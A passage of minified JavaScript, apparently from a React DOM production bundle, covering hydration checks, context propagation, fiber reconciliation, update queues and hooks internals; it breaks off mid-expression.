Ai(e){for(;e===Rs;)Rs=Da[--_a],Da[_a]=null,yn=Da[--_a],Da[_a]=null;for(;e===Tl;)Tl=Rt[--Mt],Rt[Mt]=null,Vt=Rt[--Mt],Rt[Mt]=null,Yt=Rt[--Mt],Rt[Mt]=null}function Ou(e,t){Rt[Mt++]=Yt,Rt[Mt++]=Vt,Rt[Mt++]=Tl,Yt=t.id,Vt=t.overflow,Tl=e}var Fe=null,_e=null,me=!1,El=null,Dt=!1,Ti=Error(r(519));function Nl(e){var t=Error(r(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw Sn(wt(t,e)),Ti}function ku(e){var t=e.stateNode,l=e.type,a=e.memoizedProps;switch(t[We]=e,t[ot]=a,l){case"dialog":fe("cancel",t),fe("close",t);break;case"iframe":case"object":case"embed":fe("load",t);break;case"video":case"audio":for(l=0;l<Vn.length;l++)fe(Vn[l],t);break;case"source":fe("error",t);break;case"img":case"image":case"link":fe("error",t),fe("load",t);break;case"details":fe("toggle",t);break;case"input":fe("invalid",t),Zc(t,a.value,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name,!0);break;case"select":fe("invalid",t);break;case"textarea":fe("invalid",t),Wc(t,a.value,a.defaultValue,a.children)}l=a.children,typeof l!="string"&&typeof l!="number"&&typeof l!="bigint"||t.textContent===""+l||a.suppressHydrationWarning===!0||$f(t.textContent,l)?(a.popover!=null&&(fe("beforetoggle",t),fe("toggle",t)),a.onScroll!=null&&fe("scroll",t),a.onScrollEnd!=null&&fe("scrollend",t),a.onClick!=null&&(t.onclick=Jt),t=!0):t=!1,t||Nl(e,!0)}function Hu(e){for(Fe=e.return;Fe;)switch(Fe.tag){case 5:case 31:case 13:Dt=!1;return;case 27:case 3:Dt=!0;return;default:Fe=Fe.return}}function za(e){if(e!==Fe)return!1;if(!me)return Hu(e),me=!0,!1;var t=e.tag,l;if((l=t!==3&&t!==27)&&((l=t===5)&&(l=e.type,l=!(l!=="form"&&l!=="button")||qr(e.type,e.memoizedProps)),l=!l),l&&_e&&Nl(e),Hu(e),t===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(r(317));_e=rh(e)}else if(t===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(r(317));_e=rh(e)}else t===27?(t=_e,Bl(e.type)?(e=Qr,Qr=null,_e=e):_e=t):_e=Fe?zt(e.stateNode.nextSibling):null;return!0}function aa(){_e=Fe=null,me=!1}function Ei(){var e=El;return e!==null&&(dt===null?dt=e:dt.push.apply(dt,e),El=null),e}function Sn(e){El===null?El=[e]:El.push(e)}var Ni=S(null),na=null,$t=null;function jl(e,t,l){B(Ni,t._currentValue),t._currentValue=l}function el(e){e._currentValue=Ni.current,O(Ni)}function ji(e,t,l){for(;e!==null;){var a=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,a!==null&&(a.childLanes|=t)):a!==null&&(a.childLanes&t)!==t&&(a.childLanes|=t),e===l)break;e=e.return}}function Ci(e,t,l,a){var n=e.child;for(n!==null&&(n.return=e);n!==null;){var s=n.dependencies;if(s!==null){var c=n.child;s=s.firstContext;e:for(;s!==null;){var h=s;s=n;for(var b=0;b<t.length;b++)if(h.context===t[b]){s.lanes|=l,h=s.alternate,h!==null&&(h.lanes|=l),ji(s.return,l,e),a||(c=null);break e}s=h.next}}else if(n.tag===18){if(c=n.return,c===null)throw Error(r(341));c.lanes|=l,s=c.alternate,s!==null&&(s.lanes|=l),ji(c,l,e),c=null}else c=n.child;if(c!==null)c.return=n;else for(c=n;c!==null;){if(c===e){c=null;break}if(n=c.sibling,n!==null){n.return=c.return,c=n;break}c=c.return}n=c}}function Oa(e,t,l,a){e=null;for(var n=t,s=!1;n!==null;){if(!s){if((n.flags&524288)!==0)s=!0;else if((n.flags&262144)!==0)break}if(n.tag===10){var c=n.alternate;if(c===null)throw Error(r(387));if(c=c.memoizedProps,c!==null){var h=n.type;bt(n.pendingProps.value,c.value)||(e!==null?e.push(h):e=[h])}}else if(n===le.current){if(c=n.alternate,c===null)throw Error(r(387));c.memoizedState.memoizedState!==n.memoizedState.memoizedState&&(e!==null?e.push(Zn):e=[Zn])}n=n.return}e!==null&&Ci(t,e,l,a),t.flags|=262144}function Ms(e){for(e=e.firstContext;e!==null;){if(!bt(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function sa(e){na=e,$t=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function Ie(e){return Lu(na,e)}function Ds(e,t){return na===null&&sa(e),Lu(e,t)}function Lu(e,t){var l=t._currentValue;if(t={context:t,memoizedValue:l,next:null},$t===null){if(e===null)throw Error(r(308));$t=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else $t=$t.next=t;return l}var ig=typeof AbortController<"u"?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(l,a){e.push(a)}};this.abort=function(){t.aborted=!0,e.forEach(function(l){return l()})}},rg=o.unstable_scheduleCallback,cg=o.unstable_NormalPriority,qe={$$typeof:J,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function wi(){return{controller:new ig,data:new Map,refCount:0}}function An(e){e.refCount--,e.refCount===0&&rg(cg,function(){e.controller.abort()})}var Tn=null,Ri=0,ka=0,Ha=null;function ug(e,t){if(Tn===null){var l=Tn=[];Ri=0,ka=_r(),Ha={status:"pending",value:void 0,then:function(a){l.push(a)}}}return Ri++,t.then(Uu,Uu),t}function Uu(){if(--Ri===0&&Tn!==null){Ha!==null&&(Ha.status="fulfilled");var e=Tn;Tn=null,ka=0,Ha=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function dg(e,t){var l=[],a={status:"pending",value:null,reason:null,then:function(n){l.push(n)}};return e.then(function(){a.status="fulfilled",a.value=t;for(var n=0;n<l.length;n++)(0,l[n])(t)},function(n){for(a.status="rejected",a.reason=n,n=0;n<l.length;n++)(0,l[n])(void 0)}),a}var Bu=M.S;M.S=function(e,t){Tf=mt(),typeof t=="object"&&t!==null&&typeof t.then=="function"&&ug(e,t),Bu!==null&&Bu(e,t)};var oa=S(null);function Mi(){var e=oa.current;return e!==null?e:Re.pooledCache}function _s(e,t){t===null?B(oa,oa.current):B(oa,t.pool)}function Gu(){var e=Mi();return e===null?null:{parent:qe._currentValue,pool:e}}var La=Error(r(460)),Di=Error(r(474)),zs=Error(r(542)),Os={then:function(){}};function qu(e){return e=e.status,e==="fulfilled"||e==="rejected"}function Yu(e,t,l){switch(l=e[l],l===void 0?e.push(t):l!==t&&(t.then(Jt,Jt),t=l),t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,Pu(e),e;default:if(typeof t.status=="string")t.then(Jt,Jt);else{if(e=Re,e!==null&&100<e.shellSuspendCounter)throw Error(r(482));e=t,e.status="pending",e.then(function(a){if(t.status==="pending"){var n=t;n.status="fulfilled",n.value=a}},function(a){if(t.status==="pending"){var n=t;n.status="rejected",n.reason=a}})}switch(t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,Pu(e),e}throw ra=t,La}}function ia(e){try{var t=e._init;return t(e._payload)}catch(l){throw l!==null&&typeof l=="object"&&typeof l.then=="function"?(ra=l,La):l}}var ra=null;function Vu(){if(ra===null)throw Error(r(459));var e=ra;return ra=null,e}function Pu(e){if(e===La||e===zs)throw Error(r(483))}var Ua=null,En=0;function ks(e){var t=En;return En+=1,Ua===null&&(Ua=[]),Yu(Ua,e,t)}function Nn(e,t){t=t.props.ref,e.ref=t!==void 0?t:null}function Hs(e,t){throw t.$$typeof===z?Error(r(525)):(e=Object.prototype.toString.call(t),Error(r(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)))}function Xu(e){function t(E,y){if(e){var j=E.deletions;j===null?(E.deletions=[y],E.flags|=16):j.push(y)}}function l(E,y){if(!e)return null;for(;y!==null;)t(E,y),y=y.sibling;return null}function a(E){for(var y=new Map;E!==null;)E.key!==null?y.set(E.key,E):y.set(E.index,E),E=E.sibling;return y}function n(E,y){return E=Ft(E,y),E.index=0,E.sibling=null,E}function s(E,y,j){return E.index=j,e?(j=E.alternate,j!==null?(j=j.index,j<y?(E.flags|=67108866,y):j):(E.flags|=67108866,y)):(E.flags|=1048576,y)}function c(E){return e&&E.alternate===null&&(E.flags|=67108866),E}function h(E,y,j,_){return y===null||y.tag!==6?(y=vi(j,E.mode,_),y.return=E,y):(y=n(y,j),y.return=E,y)}function b(E,y,j,_){var $=j.type;return $===L?D(E,y,j.props.children,_,j.key):y!==null&&(y.elementType===$||typeof $=="object"&&$!==null&&$.$$typeof===P&&ia($)===y.type)?(y=n(y,j.props),Nn(y,j),y.return=E,y):(y=ws(j.type,j.key,j.props,null,E.mode,_),Nn(y,j),y.return=E,y)}function C(E,y,j,_){return y===null||y.tag!==4||y.stateNode.containerInfo!==j.containerInfo||y.stateNode.implementation!==j.implementation?(y=yi(j,E.mode,_),y.return=E,y):(y=n(y,j.children||[]),y.return=E,y)}function D(E,y,j,_,$){return y===null||y.tag!==7?(y=la(j,E.mode,_,$),y.return=E,y):(y=n(y,j),y.return=E,y)}function k(E,y,j){if(typeof y=="string"&&y!==""||typeof y=="number"||typeof y=="bigint")return y=vi(""+y,E.mode,j),y.return=E,y;if(typeof y=="object"&&y!==null){switch(y.$$typeof){case V:return j=ws(y.type,y.key,y.props,null,E.mode,j),Nn(j,y),j.return=E,j;case q:return y=yi(y,E.mode,j),y.return=E,y;case P:return y=ia(y),k(E,y,j)}if(we(y)||Ue(y))return y=la(y,E.mode,j,null),y.return=E,y;if(typeof y.then=="function")return k(E,ks(y),j);if(y.$$typeof===J)return k(E,Ds(E,y),j);Hs(E,y)}return null}function w(E,y,j,_){var $=y!==null?y.key:null;if(typeof j=="string"&&j!==""||typeof j=="number"||typeof j=="bigint")return $!==null?null:h(E,y,""+j,_);if(typeof j=="object"&&j!==null){switch(j.$$typeof){case V:return j.key===$?b(E,y,j,_):null;case q:return j.key===$?C(E,y,j,_):null;case P:return j=ia(j),w(E,y,j,_)}if(we(j)||Ue(j))return $!==null?null:D(E,y,j,_,null);if(typeof j.then=="function")return w(E,y,ks(j),_);if(j.$$typeof===J)return w(E,y,Ds(E,j),_);Hs(E,j)}return null}function R(E,y,j,_,$){if(typeof _=="string"&&_!==""||typeof _=="number"||typeof _=="bigint")return E=E.get(j)||null,h(y,E,""+_,$);if(typeof _=="object"&&_!==null){switch(_.$$typeof){case V:return E=E.get(_.key===null?j:_.key)||null,b(y,E,_,$);case q:return E=E.get(_.key===null?j:_.key)||null,C(y,E,_,$);case P:return _=ia(_),R(E,y,j,_,$)}if(we(_)||Ue(_))return E=E.get(j)||null,D(y,E,_,$,null);if(typeof _.then=="function")return R(E,y,j,ks(_),$);if(_.$$typeof===J)return R(E,y,j,Ds(y,_),$);Hs(y,_)}return null}function X(E,y,j,_){for(var $=null,ge=null,W=y,ie=y=0,pe=null;W!==null&&ie<j.length;ie++){W.index>ie?(pe=W,W=null):pe=W.sibling;var xe=w(E,W,j[ie],_);if(xe===null){W===null&&(W=pe);break}e&&W&&xe.alternate===null&&t(E,W),y=s(xe,y,ie),ge===null?$=xe:ge.sibling=xe,ge=xe,W=pe}if(ie===j.length)return l(E,W),me&&It(E,ie),$;if(W===null){for(;ie<j.length;ie++)W=k(E,j[ie],_),W!==null&&(y=s(W,y,ie),ge===null?$=W:ge.sibling=W,ge=W);return me&&It(E,ie),$}for(W=a(W);ie<j.length;ie++)pe=R(W,E,ie,j[ie],_),pe!==null&&(e&&pe.alternate!==null&&W.delete(pe.key===null?ie:pe.key),y=s(pe,y,ie),ge===null?$=pe:ge.sibling=pe,ge=pe);return e&&W.forEach(function(Pl){return t(E,Pl)}),me&&It(E,ie),$}function te(E,y,j,_){if(j==null)throw Error(r(151));for(var $=null,ge=null,W=y,ie=y=0,pe=null,xe=j.next();W!==null&&!xe.done;ie++,xe=j.next()){W.index>ie?(pe=W,W=null):pe=W.sibling;var Pl=w(E,W,xe.value,_);if(Pl===null){W===null&&(W=pe);break}e&&W&&Pl.alternate===null&&t(E,W),y=s(Pl,y,ie),ge===null?$=Pl:ge.sibling=Pl,ge=Pl,W=pe}if(xe.done)return l(E,W),me&&It(E,ie),$;if(W===null){for(;!xe.done;ie++,xe=j.next())xe=k(E,xe.value,_),xe!==null&&(y=s(xe,y,ie),ge===null?$=xe:ge.sibling=xe,ge=xe);return me&&It(E,ie),$}for(W=a(W);!xe.done;ie++,xe=j.next())xe=R(W,E,ie,xe.value,_),xe!==null&&(e&&xe.alternate!==null&&W.delete(xe.key===null?ie:xe.key),y=s(xe,y,ie),ge===null?$=xe:ge.sibling=xe,ge=xe);return e&&W.forEach(function(Ax){return t(E,Ax)}),me&&It(E,ie),$}function Ce(E,y,j,_){if(typeof j=="object"&&j!==null&&j.type===L&&j.key===null&&(j=j.props.children),typeof j=="object"&&j!==null){switch(j.$$typeof){case V:e:{for(var $=j.key;y!==null;){if(y.key===$){if($=j.type,$===L){if(y.tag===7){l(E,y.sibling),_=n(y,j.props.children),_.return=E,E=_;break e}}else if(y.elementType===$||typeof $=="object"&&$!==null&&$.$$typeof===P&&ia($)===y.type){l(E,y.sibling),_=n(y,j.props),Nn(_,j),_.return=E,E=_;break e}l(E,y);break}else t(E,y);y=y.sibling}j.type===L?(_=la(j.props.children,E.mode,_,j.key),_.return=E,E=_):(_=ws(j.type,j.key,j.props,null,E.mode,_),Nn(_,j),_.return=E,E=_)}return c(E);case q:e:{for($=j.key;y!==null;){if(y.key===$)if(y.tag===4&&y.stateNode.containerInfo===j.containerInfo&&y.stateNode.implementation===j.implementation){l(E,y.sibling),_=n(y,j.children||[]),_.return=E,E=_;break e}else{l(E,y);break}else t(E,y);y=y.sibling}_=yi(j,E.mode,_),_.return=E,E=_}return c(E);case P:return j=ia(j),Ce(E,y,j,_)}if(we(j))return X(E,y,j,_);if(Ue(j)){if($=Ue(j),typeof $!="function")throw Error(r(150));return j=$.call(j),te(E,y,j,_)}if(typeof j.then=="function")return Ce(E,y,ks(j),_);if(j.$$typeof===J)return Ce(E,y,Ds(E,j),_);Hs(E,j)}return typeof j=="string"&&j!==""||typeof j=="number"||typeof j=="bigint"?(j=""+j,y!==null&&y.tag===6?(l(E,y.sibling),_=n(y,j),_.return=E,E=_):(l(E,y),_=vi(j,E.mode,_),_.return=E,E=_),c(E)):l(E,y)}return function(E,y,j,_){try{En=0;var $=Ce(E,y,j,_);return Ua=null,$}catch(W){if(W===La||W===zs)throw W;var ge=vt(29,W,null,E.mode);return ge.lanes=_,ge.return=E,ge}}}var ca=Xu(!0),Qu=Xu(!1),Cl=!1;function _i(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function zi(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function wl(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function Rl(e,t,l){var a=e.updateQueue;if(a===null)return null;if(a=a.shared,(ye&2)!==0){var n=a.pending;return n===null?t.next=t:(t.next=n.next,n.next=t),a.pending=t,t=Cs(e),Ru(e,null,l),t}return js(e,a,t,l),Cs(e)}function jn(e,t,l){if(t=t.updateQueue,t!==null&&(t=t.shared,(l&4194048)!==0)){var a=t.lanes;a&=e.pendingLanes,l|=a,t.lanes=l,Lc(e,l)}}function Oi(e,t){var l=e.updateQueue,a=e.alternate;if(a!==null&&(a=a.updateQueue,l===a)){var n=null,s=null;if(l=l.firstBaseUpdate,l!==null){do{var c={lane:l.lane,tag:l.tag,payload:l.payload,callback:null,next:null};s===null?n=s=c:s=s.next=c,l=l.next}while(l!==null);s===null?n=s=t:s=s.next=t}else n=s=t;l={baseState:a.baseState,firstBaseUpdate:n,lastBaseUpdate:s,shared:a.shared,callbacks:a.callbacks},e.updateQueue=l;return}e=l.lastBaseUpdate,e===null?l.firstBaseUpdate=t:e.next=t,l.lastBaseUpdate=t}var ki=!1;function Cn(){if(ki){var e=Ha;if(e!==null)throw e}}function wn(e,t,l,a){ki=!1;var n=e.updateQueue;Cl=!1;var s=n.firstBaseUpdate,c=n.lastBaseUpdate,h=n.shared.pending;if(h!==null){n.shared.pending=null;var b=h,C=b.next;b.next=null,c===null?s=C:c.next=C,c=b;var D=e.alternate;D!==null&&(D=D.updateQueue,h=D.lastBaseUpdate,h!==c&&(h===null?D.firstBaseUpdate=C:h.next=C,D.lastBaseUpdate=b))}if(s!==null){var k=n.baseState;c=0,D=C=b=null,h=s;do{var w=h.lane&-536870913,R=w!==h.lane;if(R?(he&w)===w:(a&w)===w){w!==0&&w===ka&&(ki=!0),D!==null&&(D=D.next={lane:0,tag:h.tag,payload:h.payload,callback:null,next:null});e:{var X=e,te=h;w=t;var Ce=l;switch(te.tag){case 1:if(X=te.payload,typeof X=="function"){k=X.call(Ce,k,w);break e}k=X;break e;case 3:X.flags=X.flags&-65537|128;case 0:if(X=te.payload,w=typeof X=="function"?X.call(Ce,k,w):X,w==null)break e;k=A({},k,w);break e;case 2:Cl=!0}}w=h.callback,w!==null&&(e.flags|=64,R&&(e.flags|=8192),R=n.callbacks,R===null?n.callbacks=[w]:R.push(w))}else R={lane:w,tag:h.tag,payload:h.payload,callback:h.callback,next:null},D===null?(C=D=R,b=k):D=D.next=R,c|=w;if(h=h.next,h===null){if(h=n.shared.pending,h===null)break;R=h,h=R.next,R.next=null,n.lastBaseUpdate=R,n.shared.pending=null}}while(!0);D===null&&(b=k),n.baseState=b,n.firstBaseUpdate=C,n.lastBaseUpdate=D,s===null&&(n.shared.lanes=0),Ol|=c,e.lanes=c,e.memoizedState=k}}function Ku(e,t){if(typeof e!="function")throw Error(r(191,e));e.call(t)}function Zu(e,t){var l=e.callbacks;if(l!==null)for(e.callbacks=null,e=0;e<l.length;e++)Ku(l[e],t)}var Ba=S(null),Ls=S(0);function Ju(e,t){e=cl,B(Ls,e),B(Ba,t),cl=e|t.baseLanes}function Hi(){B(Ls,cl),B(Ba,Ba.current)}function Li(){cl=Ls.current,O(Ba),O(Ls)}var yt=S(null),_t=null;function Ml(e){var t=e.alternate;B(Be,Be.current&1),B(yt,e),_t===null&&(t===null||Ba.current!==null||t.memoizedState!==null)&&(_t=e)}function Ui(e){B(Be,Be.current),B(yt,e),_t===null&&(_t=e)}function Wu(e){e.tag===22?(B(Be,Be.current),B(yt,e),_t===null&&(_t=e)):Dl()}function Dl(){B(Be,Be.current),B(yt,yt.current)}function St(e){O(yt),_t===e&&(_t=null),O(Be)}var Be=S(0);function Us(e){for(var t=e;t!==null;){if(t.tag===13){var l=t.memoizedState;if(l!==null&&(l=l.dehydrated,l===null||Pr(l)||Xr(l)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder==="forwards"||t.memoizedProps.revealOrder==="backwards"||t.memoizedProps.revealOrder==="unstable_legacy-backwards"||t.memoizedProps.revealOrder==="together")){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var tl=0,oe=null,Ne=null,Ye=null,Bs=!1,Ga=!1,ua=!1,Gs=0,Rn=0,qa=null,fg=0;function He(){throw Error(r(321))}function Bi(e,t){if(t===null)return!1;for(var l=0;l<t.length&&l<e.length;l++)if(!bt(e[l],t[l]))return!1;return!0}function Gi(e,t,l,a,n,s){return tl=s,oe=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,M.H=e===null||e.memoizedState===null?zd:tr,ua=!1,s=l(a,n),ua=!1,Ga&&(s=Iu(t,l,a,n)),Fu(e),s}function Fu(e){M.H=_n;var t=Ne!==null&&Ne.next!==null;if(tl=0,Ye=Ne=oe=null,Bs=!1,Rn=0,qa=null,t)throw Error(r(300));e===null||Ve||(e=e.dependencies,e!==null&&Ms(e)&&(Ve=!0))}function Iu(e,t,l,a){oe=e;var n=0;do{if(Ga&&(qa=null),Rn=0,Ga=!1,25<=n)throw Error(r(301));if(n+=1,Ye=Ne=null,e.updateQueue!=null){var s=e.updateQueue;s.lastEffect=null,s.events=null,s.stores=null,s.memoCache!=null&&(s.memoCache.index=0)}M.H=Od,s=t(l,a)}while(Ga);return s}function hg(){var e=M.H,t=e.useState()[0];return t=typeof t.then=="function"?Mn(t):t,e=e.useState()[0],(Ne!==null?Ne.memoizedState:null)!==e&&(oe.flags|=1024),t}function qi(){var e=Gs!==0;return Gs=0,e}function Yi(e,t,l){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~l}function Vi(e){if(Bs){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}Bs=!1}tl=0,Ye=Ne=oe=null,Ga=!1,Rn=Gs=0,qa=null}function st(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Ye===null?oe.memoizedState=Ye=e:Ye=Ye.next=e,Ye}function Ge(){if(Ne===null){var e=oe.alternate;e=e!==null?e.memoizedState:null}else e=Ne.next;var t=Ye===null?oe.memoizedState:Ye.next;if(t!==null)Ye=t,Ne=e;else{if(e===null)throw oe.alternate===null?Error(r(467)):Error(r(310));Ne=e,e={memoizedState:Ne.memoizedState,baseState:Ne.baseState,baseQueue:Ne.baseQueue,queue:Ne.queue,next:null},Ye===null?oe.memoizedState=Ye=e:Ye=Ye.next=e}return Ye}function qs(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Mn(e){var t=Rn;return Rn+=1,qa===null&&(qa=[]),e=Yu(qa,e,t),t=oe,(Ye===null?t.memoizedState:Ye.next)===null&&(t=t.alternate,M.H=t===null||t.memoizedState===null?zd:tr),e}function Ys(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return Mn(e);if(e.$$typeof===J)return Ie(e)}throw Error(r(438,String(e)))}function Pi(e){var t=null,l=oe.updateQueue;if(l!==null&&(t=l.memoCache),t==null){var a=oe.alternate;a!==null&&(a=a.updateQueue,a!==null&&(a=a.memoCache,a!=null&&(t={data:a.data.map(function(n){return n.slice()}),index:0})))}if(t==null&&(t={data:[],index:0}),l===null&&(l=qs(),oe.updateQueue=l),l.memoCache=t,l=t.data[t.index],l===void 0)for(l=t.data[t.index]=Array(e),a=0;a<e;a++)l[a]=ht;return t.index++,l}function ll(e,t){return typeof t=="function"?t(e):t}function Vs(e){var t=Ge();return Xi(t,Ne,e)}function Xi(e,t,l){var a=e.queue;if(a===null)throw Error(r(311));a.lastRenderedReducer=l;var n=e.baseQueue,s=a.pending;if(s!==null){if(n!==null){var c=n.next;n.next=s.next,s.next=c}t.baseQueue=n=s,a.pending=null}if(s=e.baseState,n===null)e.memoizedState=s;else{t=n.next;var h=c=null,b=null,C=t,D=!1;do{var k=C.lane&-536870913;if(k!==C.lane?(he&k)===k:(tl&k)===k){var w=C.revertLane;if(w===0)b!==null&&(b=b.next={lane:0,revertLane:0,gesture:null,action:C.action,hasEagerState:C.hasEagerState,eagerState:C.eagerState,next:null}),k===ka&&(D=!0);else if((tl&w)===w){C=C.next,w===ka&&(D=!0);continue}else k={lane:0,revertLane:C.revertLane,gesture:null,action:C.action,hasEagerState:C.hasEagerState,eagerState:C.eagerState,next:null},b===null?(h=b=k,c=s):b=b.next=k,oe.lanes|=w,Ol|=w;k=C.action,ua&&l(s,k),s=C.hasEagerState?C.eagerState:l(s,k)}else w={lane:k,revertLane:C.revertLane,gesture:C.gesture,action:C.action,hasEagerState:C.hasEagerState,eagerState:C.eagerState,next:null},b===null?(h=b=w,c=s):b=b.next=w,oe.lanes|=k,Ol|=k;C=C.next}while(C!==null&&C!==t);if(b===null?c=s:b.next=h,!bt(s,e.memoizedState)&&(Ve=!0,D&&(l=Ha,l!==null)))throw l;e.memoizedState=s,e.baseState=c,e.baseQueue=b,a.lastRenderedState=s}return n===null&&(a.lanes=0),[e.memoizedState,a.dispatch]}function Qi(e){var t=Ge(),l=t.queue;if(l===null)throw Error(r(311));l.lastRenderedReducer=e;var a=l.dispatch,n=l.pending,s=t.memoizedState;if(n!==null){l.pending=null;var c=n=n.next;do s=e(s,c.action),c=c.next;while(c!==n);bt(s,t.memoizedState)||(Ve=!0),t.memoizedState=s,t.baseQueue===null&&(t.baseState=s),l.lastRenderedState=s}return[s,a]}function $u(e,t,l){var a=oe,n=Ge(),s=me;if(s){if(l===void 0)throw Error(r(407));l=l()}else l=t();var c=!bt((Ne||n).memoizedState,l);if(c&&(n.memoizedState=l,Ve=!0),n=n.queue,Ji(ld.bind(null,a,n,e),[e]),n.getSnapshot!==t||c||Ye!==null&&Ye.memoizedState.tag&1){if(a.flags|=2048,Ya(9,{destroy:void 0},td.bind(null,a,n,l,t),null),Re===null)throw Error(r(349));s||(tl&127)!==0||ed(a,t,l)}return l}function ed(e,t,l){e.flags|=16384,e={getSnapshot:t,value:l},t=oe.updateQueue,t===null?(t=qs(),oe.updateQueue=t,t.stores=[e]):(l=t.stores,l===null?t.stores=[e]:l.push(e))}function td(e,t,l,a){t.value=l,t.getSnapshot=a,ad(t)&&nd(e)}function ld(e,t,l){return l(function(){ad(t)&&nd(e)})}function ad(e){var t=e.getSnapshot;e=e.value;try{var l=t();return!bt(e,l)}catch{return!0}}function nd(e){var t=ta(e,2);t!==null&&ft(t,e,2)}function Ki(e){var t=st();if(typeof e=="function"){var l=e;if(e=l(),ua){yl(!0);try{l()}finally{yl(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:ll,lastRenderedState:e},t}function sd(e,t,l,a){return e.baseState=l,Xi(e,Ne,typeof a=="function"?a:ll)}function pg(e,t,l,a,n){if(Qs(e))throw Error(r(485));if(e=t.action,e!==null){var s={payload:n,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(c){s.listeners.push(c)}};M.T!==null?l(!0):s.isTransition=!1,a(s),l=t.pending,l===null?(s.next=t.pending=s,od(t,s)):(s.next=l.next,t.pending=l.next=s)}}function od(e,t){var l=t.action,a=t.payload,n=e.state;if(t.isTransition){var s=M.T,c={};M.T=c;try{var h=l(n,a),b=M.S;b!==null&&b(c,h),id(e,t,h)}catch(C){Zi(e,t,C)}finally{s!==null&&c.types!==null&&(s.types=c.types),M.T=s}}else try{s=l(n,a),id(e,t,s)}catch(C){Zi(e,t,C)}}function id(e,t,l){l!==null&&typeof l=="object"&&typeof l.then=="function"?l.then(function(a){rd(e,t,a)},function(a){return Zi(e,t,a)}):rd(e,t,l)}function rd(e,t,l){t.status="fulfilled",t.value=l,cd(t),e.state=l,t=e.pending,t!==null&&(l=t.next,l===t?e.pending=null:(l=l.next,t.next=l,od(e,l)))}function Zi(e,t,l){var a=e.pending;if(e.pending=null,a!==null){a=a.next;do t.status="rejected",t.reason=l,cd(t),t=t.next;while(t!==a)}e.action=null}function cd(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function ud(e,t){return t}function dd(e,t){if(me){var l=Re.formState;if(l!==null){e:{var a=oe;if(me){if(_e){t:{for(var n=_e,s=Dt;n.nodeType!==8;){if(!s){n=null;break t}if(n=zt(n.nextSibling),n===null){n=null;break t}}s=n.data,n=s==="F!"||s==="F"?n:null}if(n){_e=zt(n.nextSibling),a=n.data==="F!";break e}}Nl(a)}a=!1}a&&(t=l[0])}}return l=st(),l.memoizedState=l.baseState=t,a={pending:null,lanes:0,dispatch:null,lastRenderedReducer:ud,lastRenderedState:t},l.queue=a,l=Md.bind(null,oe,a),a.dispatch=l,a=Ki(!1),s=er.bind(null,oe,!1,a.queue),a=st(),n={state:t,dispatch:null,action:e,pending:null},a.queue=n,l=pg.bind(null,oe,n,s,l),n.dispatch=l,a.memoizedState=e,[t,l,!1]}function fd(e){var t=Ge();return hd(t,Ne,e)}function hd(e,t,l){if(t=Xi(e,t,ud)[0],e=Vs(ll)[0],typeof t=="object"&&t!==null&&typeof t.then=="function")try{var a=Mn(t)}catch(c){throw c===La?zs:c}else a=t;t=Ge();var n=t.queue,s=n.dispatch;return l!==t.memoizedState&&(oe.flags|=2048,Ya(9,{destroy:void 0},mg.bind(null,n,l),null)),[a,s,e]}function mg(e,t){e.action=t}function pd(e){var t=Ge(),l=Ne;if(l!==null)return hd(t,l,e);Ge(),t=t.memoizedState,l=Ge();var a=l.queue.dispatch;return l.memoizedState=e,[t,a,!1]}function Ya(e,t,l,a){return e={tag:e,create:l,deps:a,inst:t,next:null},t=oe.updateQueue,t===null&&(t=qs(),oe.updateQueue=t),l=t.lastEffect,l===null?t.lastEffect=e.next=e:(a=l.next,l.next=e,e.next=a,t.lastEffect=e),e}function md(){return Ge().memoizedState}function Ps(e,t,l,a){var n=st();oe.flags|=e,n.memoizedState=Ya(1|t,{destroy:void 0},l,a===void 0?null:a)}function Xs(e,t,l,a){var n=Ge();a=a===void 0?null:a;var s=n.memoizedState.inst;Ne!==null&&a!==null&&Bi(a,Ne.memoizedState.deps)?n.memoizedState=Ya(t,s,l,a):(oe.flags|=e,n.memoizedState=Ya(1|t,s,l,a))}function gd(e,t){Ps(8390656,8,e,t)}function Ji(e,t){Xs(2048,8,e,t)}function gg(e){oe.flags|=4;var t=oe.updateQueue;if(t===null)t=qs(),oe.updateQueue=t,t.events=[e];else{var l=t.events;l===null?t.events=[e]:l.push(e)}}function xd(e){var t=Ge().memoizedState;return gg({ref:t,nextImpl:e}),function(){if((ye&2)!==0)throw Error(r(440));return t.impl.apply(void 0,arguments)}}function bd(e,t){return Xs(4,2,e,t)}function vd(e,t){return Xs(4,4,e,t)}function yd(e,t){if(typeof 